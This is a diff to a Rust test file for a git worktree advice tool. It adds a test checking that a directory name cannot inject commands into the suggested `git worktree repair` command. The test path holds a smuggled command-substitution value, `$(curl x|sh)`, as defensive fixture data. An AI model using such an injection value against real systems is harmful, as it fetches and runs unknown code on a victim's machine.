@@ -331,10 +331,25 @@ fn only_a_missing_checkout_is_advised_to_prune() {
         snippets(builtin::Anomaly::Missing),
         ["git worktree prune --dry-run --verbose"]
     );
-    assert_eq!(
-        snippets(moved),
-        [format!("git worktree repair {}", path.display())]
-    );
+    assert_eq!(snippets(moved), ["git worktree repair"]);
     assert_eq!(snippets(gone), [] as [String; 0]);
     assert_eq!(snippets(builtin::Anomaly::Invalid), [] as [String; 0]);
+}
+
+/// Catches a directory's name reaching a command: a person pastes the advice, and a
+/// checkout's name can come from a repository or an agent, so `$(…)` would run and a space
+/// would repair the wrong path. The sentence still has to say which directory.
+#[test]
+fn repair_advice_names_the_directory_and_keeps_it_out_of_the_command() {
+    let path = Path::new("/work/my 'app' $(curl x|sh)");
+    let moved = builtin::Anomaly::Unregistered(path, builtin::Unregistered::Moved);
+
+    let advice = builtin::registration_advice(moved);
+
+    assert_eq!(advice.snippets, ["git worktree repair"]);
+    assert!(
+        advice.text.contains(path.to_str().unwrap_or_default()),
+        "says which directory: {}",
+        advice.text
+    );
 }
